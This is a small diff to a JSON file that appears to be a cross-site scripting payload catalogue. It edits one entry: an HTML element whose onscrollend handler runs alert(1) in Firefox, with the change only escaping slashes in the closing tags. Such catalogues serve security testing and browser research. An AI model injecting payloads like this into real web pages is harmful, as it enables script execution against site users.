@@ -9374,7 +9374,7 @@
         "tags": [
             {
                 "tag": "*",
-                "code": "<* onscrollend=alert(1) style=\"display:block;overflow:auto;border:1px dashed;width:500px;height:100px;\"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></*>",
+                "code": "<* onscrollend=alert(1) style=\"display:block;overflow:auto;border:1px dashed;width:500px;height:100px;\"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test<\/span><\/*>",
                 "browsers": [            
                     "firefox"
                 ],
